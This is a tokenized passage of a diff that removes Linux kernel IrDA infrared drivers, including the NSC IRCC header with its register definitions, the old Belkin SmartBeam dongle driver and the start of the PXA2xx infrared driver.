",", "ioport", ",", "NULL", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "io", ",", "\"", "Base", "I", "/", "O", "addresses", "\"", ");", "module_param_hw_array", "(", "irq", ",", "int", ",", "irq", ",", "NULL", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "irq", ",", "\"", "IRQ", "lines", "\"", ");", "module_param_hw_array", "(", "dma", ",", "int", ",", "dma", ",", "NULL", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "dma", ",", "\"", "DMA", "channels", "\"", ");", "module_param", "(", "dongle_id", ",", "int", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "dongle_id", ",", "\"", "Type", "-", "id", "of", "used", "dongle", "\"", ");", "module_init", "(", "nsc_ircc_init", ")", ";", "module_exit", "(", "nsc_ircc_cleanup", ")", ";", "@", "@", "-", "1", ",", "281", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "nsc", "-", "ircc", ".", "h", "*", "Version", ":", "*", "Description", ":", "*", "Status", ":", "Experimental", ".", "*", "Author", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "Created", "at", ":", "Fri", "Nov", "13", "14", ":", "37", ":", "40", "1998", "*", "Modified", "at", ":", "Sun", "Jan", "23", "17", ":", "47", ":", "00", "2000", "*", "Modified", "by", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "*", "Copyright", "(", "c", ")", "1998", "-", "2000", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "Copyright", "(", "c", ")", "1998", "Lichen", "Wang", ",", "<", "lwang", "@", "actisys", ".", "com", ">", "*", "Copyright", "(", "c", ")", "1998", "Actisys", "Corp", ".", ",", "www", ".", "actisys", ".", "com", "*", "All", "Rights", "Reserved", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "Neither", "Dag", "Brattli", "nor", "University", "of", "Troms", "\u00f8", "admit", "liability", "nor", "*", "provide", "warranty", "for", "any", "of", "this", "software", ".", "This", "material", "is", "*", "provided", "\"", "AS", "-", "IS", "\"", "and", "at", "no", "charge", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "ifndef", "NSC_IRCC_H", "#", "define", "NSC_IRCC_H", "#", "include", "<", "linux", "/", "ktime", ".", "h", ">", "#", "include", "<", "linux", "/", "spinlock", ".", "h", ">", "#", "include", "<", "linux", "/", "pm", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "asm", "/", "io", ".", "h", ">", "/", "*", "Features", "for", "chips", "(", "set", "in", "driver_data", ")", "*", "/", "#", "define", "NSC_FORCE_DONGLE_TYPE9", "0x00000001", "/", "*", "DMA", "modes", "needed", "*", "/", "#", "define", "DMA_TX_MODE", "0x08", "/", "*", "Mem", "to", "I", "/", "O", ",", "+", "+,", "demand", ".", "*", "/", "#", "define", "DMA_RX_MODE", "0x04", "/", "*", "I", "/", "O", "to", "mem", ",", "+", "+,", "demand", ".", "*", "/", "/", "*", "Config", "registers", "for", "the", "'", "108", "*", "/", "#", "define", "CFG_108_BAIC", "0x00", "#", "define", "CFG_108_CSRT", "0x01", "#", "define", "CFG_108_MCTL", "0x02", "/", "*", "Config", "registers", "for", "the", "'", "338", "*", "/", "#", "define", "CFG_338_FER", "0x00", "#", "define", "CFG_338_FAR", "0x01", "#", "define", "CFG_338_PTR", "0x02", "#", "define", "CFG_338_PNP0", "0x1b", "#", "define", "CFG_338_PNP1", "0x1c", "#", "define", "CFG_338_PNP3", "0x4f", "/", "*", "Config", "registers", "for", "the", "'", "39x", "(", "in", "the", "logical", "device", "bank", ")", "*", "/", "#", "define", "CFG_39X_LDN", "0x07", "/", "*", "Logical", "device", "number", "(", "Super", "I", "/", "O", "bank", ")", "*", "/", "#", "define", "CFG_39X_SIOCF1", "0x21", "/", "*", "SuperI", "/", "O", "Config", "*", "/", "#", "define", "CFG_39X_ACT", "0x30", "/", "*", "Device", "activation", "*", "/", "#", "define", "CFG_39X_BASEH", "0x60", "/", "*", "Device", "base", "address", "(", "high", "bits", ")", "*", "/", "#", "define", "CFG_39X_BASEL", "0x61", "/", "*", "Device", "base", "address", "(", "low", "bits", ")", "*", "/", "#", "define", "CFG_39X_IRQNUM", "0x70", "/", "*", "Interrupt", "number", "&", "wake", "up", "enable", "*", "/", "#", "define", "CFG_39X_IRQSEL", "0x71", "/", "*", "Interrupt", "select", "(", "edge", "/", "level", "+", "polarity", ")", "*", "/", "#", "define", "CFG_39X_DMA0", "0x74", "/", "*", "DMA", "0", "configuration", "*", "/", "#", "define", "CFG_39X_DMA1", "0x75", "/", "*", "DMA", "1", "configuration", "*", "/", "#", "define", "CFG_39X_SPC", "0xF0", "/", "*", "Serial", "port", "configuration", "register", "*", "/", "/", "*", "Flags", "for", "configuration", "register", "CRF0", "*", "/", "#", "define", "APEDCRC", "0x02", "#", "define", "ENBNKSEL", "0x01", "/", "*", "Set", "0", "*", "/", "#", "define", "TXD", "0x00", "/", "*", "Transmit", "data", "port", "*", "/", "#", "define", "RXD", "0x00", "/", "*", "Receive", "data", "port", "*", "/", "/", "*", "Register", "1", "*", "/", "#", "define", "IER", "0x01", "/", "*", "Interrupt", "Enable", "Register", "*", "/", "#", "define", "IER_RXHDL_IE", "0x01", "/", "*", "Receiver", "high", "data", "level", "interrupt", "*", "/", "#", "define", "IER_TXLDL_IE", "0x02", "/", "*", "Transeiver", "low", "data", "level", "interrupt", "*", "/", "#", "define", "IER_LS_IE", "0x04", "/", "/*", "Link", "Status", "Interrupt", "*", "/", "#", "define", "IER_ETXURI", "0x04", "/", "*", "Tx", "underrun", "*", "/", "#", "define", "IER_DMA_IE", "0x10", "/", "*", "DMA", "finished", "interrupt", "*", "/", "#", "define", "IER_TXEMP_IE", "0x20", "#", "define", "IER_SFIF_IE", "0x40", "/", "*", "Frame", "status", "FIFO", "intr", "*", "/", "#", "define", "IER_TMR_IE", "0x80", "/", "*", "Timer", "event", "*", "/", "#", "define", "FCR", "0x02", "/", "*", "(", "write", "only", ")", "*", "/", "#", "define", "FCR_FIFO_EN", "0x01", "/", "*", "Enable", "FIFO", "'", "s", "*", "/", "#", "define", "FCR_RXSR", "0x02", "/", "*", "Rx", "FIFO", "soft", "reset", "*", "/", "#", "define", "FCR_TXSR", "0x04", "/", "*", "Tx", "FIFO", "soft", "reset", "*", "/", "#", "define", "FCR_RXTH", "0x40", "/", "*", "Rx", "FIFO", "threshold", "(", "set", "to", "16", ")", "*", "/", "#", "define", "FCR_TXTH", "0x20", "/", "*", "Tx", "FIFO", "threshold", "(", "set", "to", "17", ")", "*", "/", "#", "define", "EIR", "0x02", "/", "*", "(", "read", "only", ")", "*", "/", "#", "define", "EIR_RXHDL_EV", "0x01", "#", "define", "EIR_TXLDL_EV", "0x02", "#", "define", "EIR_LS_EV", "0x04", "#", "define", "EIR_DMA_EV", "0x10", "#", "define", "EIR_TXEMP_EV", "0x20", "#", "define", "EIR_SFIF_EV", "0x40", "#", "define", "EIR_TMR_EV", "0x80", "#", "define", "LCR", "0x03", "/", "*", "Link", "control", "register", "*", "/", "#", "define", "LCR_WLS_8", "0x03", "/", "*", "8", "bits", "*", "/", "#", "define", "BSR", "0x03", "/", "*", "Bank", "select", "register", "*", "/", "#", "define", "BSR_BKSE", "0x80", "#", "define", "BANK0", "LCR_WLS_8", "/", "*", "Must", "make", "sure", "that", "we", "set", "8N1", "*", "/", "#", "define", "BANK1", "0x80", "#", "define", "BANK2", "0xe0", "#", "define", "BANK3", "0xe4", "#", "define", "BANK4", "0xe8", "#", "define", "BANK5", "0xec", "#", "define", "BANK6", "0xf0", "#", "define", "BANK7", "0xf4", "#", "define", "MCR", "0x04", "/", "*", "Mode", "Control", "Register", "*", "/", "#", "define", "MCR_MODE_MASK", "~", "(", "0xd0", ")", "#", "define", "MCR_UART", "0x00", "#", "define", "MCR_RESERVED", "0x20", "#", "define", "MCR_SHARP_IR", "0x40", "#", "define", "MCR_SIR", "0x60", "#", "define", "MCR_MIR", "0x80", "#", "define", "MCR_FIR", "0xa0", "#", "define", "MCR_CEIR", "0xb0", "#", "define", "MCR_IR_PLS", "0x10", "#", "define", "MCR_DMA_EN", "0x04", "#", "define", "MCR_EN_IRQ", "0x08", "#", "define", "MCR_TX_DFR", "0x08", "#", "define", "LSR", "0x05", "/", "*", "Link", "status", "register", "*", "/", "#", "define", "LSR_RXDA", "0x01", "/", "*", "Receiver", "data", "available", "*", "/", "#", "define", "LSR_TXRDY", "0x20", "/", "*", "Transmitter", "ready", "*", "/", "#", "define", "LSR_TXEMP", "0x40", "/", "*", "Transmitter", "empty", "*", "/", "#", "define", "ASCR", "0x07", "/", "*", "Auxiliary", "Status", "and", "Control", "Register", "*", "/", "#", "define", "ASCR_RXF_TOUT", "0x01", "/", "*", "Rx", "FIFO", "timeout", "*", "/", "#", "define", "ASCR_FEND_INF", "0x02", "/", "*", "Frame", "end", "bytes", "in", "rx", "FIFO", "*", "/", "#", "define", "ASCR_S_EOT", "0x04", "/", "*", "Set", "end", "of", "transmission", "*", "/", "#", "define", "ASCT_RXBSY", "0x20", "/", "*", "Rx", "busy", "*", "/", "#", "define", "ASCR_TXUR", "0x40", "/", "*", "Transeiver", "underrun", "*", "/", "#", "define", "ASCR_CTE", "0x80", "/", "*", "Clear", "timer", "event", "*", "/", "/", "*", "Bank", "2", "*", "/", "#", "define", "BGDL", "0x00", "/", "*", "Baud", "Generator", "Divisor", "Port", "(", "Low", "Byte", ")", "*", "/", "#", "define", "BGDH", "0x01", "/", "*", "Baud", "Generator", "Divisor", "Port", "(", "High", "Byte", ")", "*", "/", "#", "define", "ECR1", "0x02", "/", "*", "Extended", "Control", "Register", "1", "*", "/", "#", "define", "ECR1_EXT_SL", "0x01", "/", "*", "Extended", "Mode", "Select", "*", "/", "#", "define", "ECR1_DMANF", "0x02", "/", "*", "DMA", "Fairness", "*", "/", "#", "define", "ECR1_DMATH", "0x04", "/", "*", "DMA", "Threshold", "*", "/", "#", "define", "ECR1_DMASWP", "0x08", "/", "*", "DMA", "Swap", "*", "/", "#", "define", "EXCR2", "0x04", "#", "define", "EXCR2_TFSIZ", "0x01", "/", "*", "Rx", "FIFO", "size", "=", "32", "*", "/", "#", "define", "EXCR2_RFSIZ", "0x04", "/", "*", "Tx", "FIFO", "size", "=", "32", "*", "/", "#", "define", "TXFLV", "0x06", "/", "*", "Tx", "FIFO", "level", "*", "/", "#", "define", "RXFLV", "0x07", "/", "*", "Rx", "FIFO", "level", "*", "/", "/", "*", "Bank", "3", "*", "/", "#", "define", "MID", "0x00", "/", "*", "Bank", "4", "*", "/", "#", "define", "TMRL", "0x00", "/", "*", "Timer", "low", "byte", "*", "/", "#", "define", "TMRH", "0x01", "/", "*", "Timer", "high", "byte", "*", "/", "#", "define", "IRCR1", "0x02", "/", "*", "Infrared", "control", "register", "1", "*", "/", "#", "define", "IRCR1_TMR_EN", "0x01", "/", "*", "Timer", "enable", "*", "/", "#", "define", "TFRLL", "0x04", "#", "define", "TFRLH", "0x05", "#", "define", "RFRLL", "0x06", "#", "define", "RFRLH", "0x07", "/", "*", "Bank", "5", "*", "/", "#", "define", "IRCR2", "0x04", "/", "*", "Infrared", "control", "register", "2", "*", "/", "#", "define", "IRCR2_MDRS", "0x04", "/", "*", "MIR", "data", "rate", "select", "*", "/", "#", "define", "IRCR2_FEND_MD", "0x20", "/", "*", "*", "/", "#", "define", "FRM_ST", "0x05", "/", "*", "Frame", "status", "FIFO", "*", "/", "#", "define", "FRM_ST_VLD", "0x80", "/", "*", "Frame", "status", "FIFO", "data", "valid", "*", "/", "#", "define", "FRM_ST_ERR_MSK", "0x5f", "#", "define", "FRM_ST_LOST_FR", "0x40", "/", "*", "Frame", "lost", "*", "/", "#", "define", "FRM_ST_MAX_LEN", "0x10", "/", "*", "Max", "frame", "len", "exceeded", "*", "/", "#", "define", "FRM_ST_PHY_ERR", "0x08", "/", "*", "Physical", "layer", "error", "*", "/", "#", "define", "FRM_ST_BAD_CRC", "0x04", "#", "define", "FRM_ST_OVR1", "0x02", "/", "*", "Rx", "FIFO", "overrun", "*", "/", "#", "define", "FRM_ST_OVR2", "0x01", "/", "*", "Frame", "status", "FIFO", "overrun", "*", "/", "#", "define", "RFLFL", "0x06", "#", "define", "RFLFH", "0x07", "/", "*", "Bank", "6", "*", "/", "#", "define", "IR_CFG2", "0x00", "#", "define", "IR_CFG2_DIS_CRC", "0x02", "/", "*", "Bank", "7", "*", "/", "#", "define", "IRM_CR", "0x07", "/", "*", "Infrared", "module", "control", "register", "*", "/", "#", "define", "IRM_CR_IRX_MSL", "0x40", "#", "define", "IRM_CR_AF_MNT", "0x80", "/", "*", "Automatic", "format", "*", "/", "/", "*", "NSC", "chip", "information", "*", "/", "struct", "nsc_chip", "{", "char", "*", "name", ";", "/", "*", "Name", "of", "chipset", "*", "/", "int", "cfg", "[", "3", "]", ";", "/", "*", "Config", "registers", "*", "/", "u_int8_t", "cid_index", ";", "/", "*", "Chip", "identification", "index", "reg", "*", "/", "u_int8_t", "cid_value", ";", "/", "*", "Chip", "identification", "expected", "value", "*", "/", "u_int8_t", "cid_mask", ";", "/", "*", "Chip", "identification", "revision", "mask", "*", "/", "/", "*", "Functions", "for", "probing", "and", "initializing", "the", "specific", "chip", "*", "/", "int", "(", "*", "probe", ")", "(", "struct", "nsc_chip", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "int", "(", "*", "init", ")", "(", "struct", "nsc_chip", "*", "chip", ",", "chipio_t", "*", "info", ")", ";", "}", ";", "typedef", "struct", "nsc_chip", "nsc_chip_t", ";", "/", "*", "For", "storing", "entries", "in", "the", "status", "FIFO", "*", "/", "struct", "st_fifo_entry", "{", "int", "status", ";", "int", "len", ";", "}", ";", "#", "define", "MAX_TX_WINDOW", "7", "#", "define", "MAX_RX_WINDOW", "7", "struct", "st_fifo", "{", "struct", "st_fifo_entry", "entries", "[", "MAX_RX_WINDOW", "]", ";", "int", "pending_bytes", ";", "int", "head", ";", "int", "tail", ";", "int", "len", ";", "}", ";", "struct", "frame_cb", "{", "void", "*", "start", ";", "/", "*", "Start", "of", "frame", "in", "DMA", "mem", "*", "/", "int", "len", ";", "/", "*", "Length", "of", "frame", "in", "DMA", "mem", "*", "/", "}", ";", "struct", "tx_fifo", "{", "struct", "frame_cb", "queue", "[", "MAX_TX_WINDOW", "]", ";", "/", "*", "Info", "about", "frames", "in", "queue", "*", "/", "int", "ptr", ";", "/", "*", "Currently", "being", "sent", "*", "/", "int", "len", ";", "/", "*", "Length", "of", "queue", "*", "/", "int", "free", ";", "/", "*", "Next", "free", "slot", "*", "/", "void", "*", "tail", ";", "/", "*", "Next", "free", "start", "in", "DMA", "mem", "*", "/", "}", ";", "/", "*", "Private", "data", "for", "each", "instance", "*", "/", "struct", "nsc_ircc_cb", "{", "struct", "st_fifo", "st_fifo", ";", "/", "*", "Info", "about", "received", "frames", "*", "/", "struct", "tx_fifo", "tx_fifo", ";", "/", "*", "Info", "about", "frames", "to", "be", "transmitted", "*", "/", "struct", "net_device", "*", "netdev", ";", "/", "*", "Yes", "!", "we", "are", "some", "kind", "of", "netdevice", "*", "/", "struct", "irlap_cb", "*", "irlap", ";", "/", "*", "The", "link", "layer", "we", "are", "binded", "to", "*", "/", "struct", "qos_info", "qos", ";", "/", "*", "QoS", "capabilities", "for", "this", "device", "*", "/", "chipio_t", "io", ";", "/", "*", "IrDA", "controller", "information", "*", "/", "iobuff_t", "tx_buff", ";", "/", "*", "Transmit", "buffer", "*", "/", "iobuff_t", "rx_buff", ";", "/", "*", "Receive", "buffer", "*", "/", "dma_addr_t", "tx_buff_dma", ";", "dma_addr_t", "rx_buff_dma", ";", "__u8", "ier", ";", "/", "*", "Interrupt", "enable", "register", "*", "/", "ktime_t", "stamp", ";", "spinlock_t", "lock", ";", "/", "*", "For", "serializing", "operations", "*", "/", "__u32", "new_speed", ";", "int", "index", ";", "/", "*", "Instance", "index", "*", "/", "struct", "platform_device", "*", "pldev", ";", "}", ";", "static", "inline", "void", "switch_bank", "(", "int", "iobase", ",", "int", "bank", ")", "{", "outb", "(", "bank", ",", "iobase", "+", "BSR", ")", ";", "}", "#", "endif", "/", "*", "NSC_IRCC_H", "*", "/", "@", "@", "-", "1", ",", "146", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "old_belkin", ".", "c", "*", "Version", ":", "1", ".", "1", "*", "Description", ":", "Driver", "for", "the", "Belkin", "(", "old", ")", "SmartBeam", "dongle", "*", "Status", ":", "Experimental", ".", "..", "*", "Author", ":", "Jean", "Tourrilhes", "<", "jt", "@", "hpl", ".", "hp", ".", "com", ">", "*", "Created", "at", ":", "22", "/", "11", "/", "99", "*", "Modified", "at", ":", "Fri", "Dec", "17", "09", ":", "13", ":", "32", "1999", "*", "Modified", "by", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "*", "Copyright", "(", "c", ")", "1999", "Jean", "Tourrilhes", ",", "All", "Rights", "Reserved", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "see", "<", "http", ":", "//", "www", ".", "gnu", ".", "org", "/", "licenses", "/", ">.", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "/", "/", "#", "include", "<", "net", "/", "irda", "/", "irda_device", ".", "h", ">", "#", "include", "\"", "sir", "-", "dev", ".", "h", "\"", "/", "*", "*", "Belkin", "is", "selling", "a", "dongle", "called", "the", "SmartBeam", ".", "*", "In", "fact", ",", "there", "is", "two", "hardware", "version", "of", "this", "dongle", ",", "of", "course", "with", "*", "the", "same", "name", "and", "looking", "the", "exactly", "same", "(", "grrr", ".", "..", ").", "*", "I", "guess", "that", "I", "'", "ve", "got", "the", "old", "one", ",", "because", "inside", "I", "don", "'", "t", "have", "*", "a", "jumper", "for", "IrDA", "/", "ASK", ".", "..", "*", "*", "As", "far", "as", "I", "can", "make", "it", "from", "info", "on", "their", "web", "site", ",", "the", "old", "dongle", "*", "support", "only", "9600", "b", "/", "s", ",", "which", "make", "our", "life", "much", "simpler", "as", "far", "as", "*", "the", "driver", "is", "concerned", ",", "but", "you", "might", "not", "like", "it", "very", "much", ";", "-)", "*", "The", "new", "SmartBeam", "does", "115", "kb", "/", "s", ",", "and", "I", "'", "ve", "not", "tested", "it", ".", "..", "*", "*", "Belkin", "claim", "that", "the", "correct", "driver", "for", "the", "old", "dongle", "(", "in", "Windows", ")", "*", "is", "the", "generic", "Parallax", "9500a", "driver", ",", "but", "the", "Linux", "LiteLink", "driver", "*", "fails", "for", "me", "(", "probably", "because", "Linux", "-", "IrDA", "doesn", "'", "t", "rate", "fallback", ")", ",", "*", "so", "I", "created", "this", "really", "dumb", "driver", ".", "..", "*", "*", "In", "fact", ",", "this", "driver", "doesn", "'", "t", "do", "much", ".", "The", "only", "thing", "it", "does", "is", "to", "*", "prevent", "Linux", "-", "IrDA", "to", "use", "any", "other", "speed", "than", "9600", "b", "/", "s", ";", "-)", "This", "*", "driver", "is", "called", "\"", "old_belkin", "\"", "so", "that", "when", "the", "new", "SmartBeam", "is", "supported", "*", "its", "driver", "can", "be", "called", "\"", "belkin", "\"", "instead", "of", "\"", "new_belkin", "\"", ".", "*", "*", "Note", ":", "this", "driver", "was", "written", "without", "any", "info", "/", "help", "from", "Belkin", ",", "*", "so", "a", "lot", "of", "info", "here", "might", "be", "totally", "wrong", ".", "Blame", "me", ";", "-)", "*", "/", "static", "int", "old_belkin_open", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "old_belkin_close", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "old_belkin_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", ";", "static", "int", "old_belkin_reset", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "struct", "dongle_driver", "old_belkin", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "driver_name", "=", "\"", "Old", "Belkin", "SmartBeam", "\"", ",", ".", "type", "=", "IRDA_OLD_BELKIN_DONGLE", ",", ".", "open", "=", "old_belkin_open", ",", ".", "close", "=", "old_belkin_close", ",", ".", "reset", "=", "old_belkin_reset", ",", ".", "set_speed", "=", "old_belkin_change_speed", ",", "}", ";", "static", "int", "__init", "old_belkin_sir_init", "(", "void", ")", "{", "return", "irda_register_dongle", "(", "&", "old_belkin", ")", ";", "}", "static", "void", "__exit", "old_belkin_sir_cleanup", "(", "void", ")", "{", "irda_unregister_dongle", "(", "&", "old_belkin", ")", ";", "}", "static", "int", "old_belkin_open", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "qos_info", "*", "qos", "=", "&", "dev", "-", ">", "qos", ";", "/", "*", "Power", "on", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "/", "*", "Not", "too", "fast", ",", "please", ".", "..", "*", "/", "qos", "-", ">", "baud_rate", ".", "bits", "&", "=", "IR_9600", ";", "/", "*", "Needs", "at", "least", "10", "ms", "(", "totally", "wild", "guess", ",", "can", "do", "probably", "better", ")", "*", "/", "qos", "-", ">", "min_turn_time", ".", "bits", "=", "0x01", ";", "irda_qos_bits_to_value", "(", "qos", ")", ";", "/", "*", "irda", "thread", "waits", "50", "msec", "for", "power", "settling", "*", "/", "return", "0", ";", "}", "static", "int", "old_belkin_close", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "Power", "off", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "old_belkin_change_speed", "(", "task", ")", "*", "*", "With", "only", "one", "speed", "available", ",", "not", "much", "to", "do", ".", "..", "*", "/", "static", "int", "old_belkin_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", "{", "dev", "-", ">", "speed", "=", "9600", ";", "return", "(", "speed", "=", "=", "dev", "-", ">", "speed", ")", "?", "0", ":", "-", "EINVAL", ";", "}", "/", "*", "*", "Function", "old_belkin_reset", "(", "task", ")", "*", "*", "Reset", "the", "Old", "-", "Belkin", "type", "dongle", ".", "*", "*", "/", "static", "int", "old_belkin_reset", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "This", "dongles", "speed", "\"", "defaults", "\"", "to", "9600", "bps", ";", "-)", "*", "/", "dev", "-", ">", "speed", "=", "9600", ";", "return", "0", ";", "}", "MODULE_AUTHOR", "(", "\"", "Jean", "Tourrilhes", "<", "jt", "@", "hpl", ".", "hp", ".", "com", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "Belkin", "(", "old", ")", "SmartBeam", "dongle", "driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_ALIAS", "(", "\"", "irda", "-", "dongle", "-", "7", "\"", ");", "/", "*", "IRDA_OLD_BELKIN_DONGLE", "*", "/", "module_init", "(", "old_belkin_sir_init", ")", ";", "module_exit", "(", "old_belkin_sir_cleanup", ")", ";", "@", "@", "-", "1", ",", "1075", "+", "0", ",", "0", "@", "@", "/", "*", "*", "linux", "/", "drivers", "/", "net", "/", "irda", "/", "pxaficp_ir", ".", "c", "*", "*", "Based", "on", "sa1100_ir", ".", "c", "by", "Russell", "King", "*", "*", "Changes", "copyright", "(", "C", ")", "2003", "-", "2005", "MontaVista", "Software", ",", "Inc", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "version", "2", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ".", "*", "*", "Infra", "-", "red", "driver", "(", "SIR", "/", "FIR", ")", "for", "the", "PXA2xx", "embedded", "microprocessor", "*", "*", "/", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "netdevice", ".", "h", ">", "#", "include", "<", "linux", "/", "etherdevice", ".", "h", ">", "#", "include", "<", "linux", "/", "platform_device", ".", "h", ">", "#", "include", "<", "linux", "/", "clk", ".", "h", ">", "#", "include", "<", "linux", "/", "dmaengine", ".", "h", ">", "#", "include", "<", "linux", "/", "dma", "-", "mapping", ".", "h", ">", "#", "include", "<", "linux", "/", "dma", "/", "pxa", "-", "dma", ".", "h", ">", "#", "include", "<", "linux", "/", "gpio", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "sched", "/", "clock", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irmod", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "wrapper", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda_device", ".", "h", ">", "#", "include", "<", "linux", "/", "platform_data", "/", "irda", "-", "pxaficp", ".", "h", ">", "#", "undef", "__REG", "#", "define", "__REG", "(", "x", ")", "(", "(", "x", ")", "&", "0xffff", ")", "#", "include", "<", "mach", "/", "regs", "-", "uart", ".", "h", ">", "#", "define", "ICCR0", "0x0000", "/", "*", "ICP", "Control", "Register", "0", "*", "/", "#", "define", "ICCR1", "0x0004", "/", "*", "ICP", "Control", "Register", "1", "*", "/", "#", "define", "ICCR2", "0x0008", "/", "*", "ICP", "Control", "Register", "2", "*", "/", "#", "define", "ICDR", "0x000c", "/", "*", "ICP", "Data", "Register", "*", "/", "#", "define", "ICSR0", "0x0014", "/", "*", "ICP", "Status", "Register", "0", "*", "/", "#", "define", "ICSR1", "0x0018", "/", "*", "ICP", "Status", "Register", "1", "*", "/", "#", "define", "ICCR0_AME", "(", "1", "<", "<", "7", ")", "/", "*", "Address", "match", "enable", "*", "/", "#", "define", "ICCR0_TIE", "(", "1", "<", "<", "6", ")", "/", "*", "Transmit", "FIFO", "interrupt", "enable", "*", "/", "#", "define", "ICCR0_RIE", "(", "1", "<", "<", "5", ")", "/", "*", "Receive", "FIFO", "interrupt", "enable", "*", "/", "#", "define", "ICCR0_RXE", "(", "1", "<", "<", "4", ")", "/", "*", "Receive", "enable", "*", "/", "#", "define", "ICCR0_TXE", "(", "1", "<", "<", "3", ")", "/", "*", "Transmit", "enable", "*", "/", "#", "define", "ICCR0_TUS", "(", "1", "<", "<", "2", ")", "/", "*", "Transmit", "FIFO", "underrun", "select", "*", "/", "#", "define", "ICCR0_LBM", "(", "1", "<", "<", "1", ")", "/", "*", "Loopback", "mode", "*", "/", "#", "define", "ICCR0_ITR", "(", "1", "<", "<", "0", ")", "/", "*", "IrDA", "transmission", "*", "/", "#", "define", "ICCR2_RXP", "(", "1", "<", "<", "3", ")", "/", "*", "Receive", "Pin", "Polarity", "select", "*", "/", "#", "define", "ICCR2_TXP", "(", "1", "<", "<", "2", ")", "/", "*", "Transmit", "Pin", "Polarity", "select", "*", "/", "#", "define", "ICCR2_TRIG", "(", "3", "<", "<", "0", ")", "/", "*", "Receive", "FIFO", "Trigger", "threshold", "*", "/", "#", "define", "ICCR2_TRIG_8", "(", "0", "<", "<", "0", ")", "/", "*", ">", "=", "8", "bytes", "*", "/", "#", "define", "ICCR2_TRIG_16", "(", "1", "<", "<", "0", ")", "/", "*", ">", "=", "16", "bytes", "*", "/", "#", "define", "ICCR2_TRIG_32", "(", "2", "<", "<", "0", ")", "/", "*", ">", "=", "32", "bytes", "*", "/", "#", "define", "ICSR0_EOC", "(", "1", "<", "<", "6", ")", "/", "*", "DMA", "End", "of", 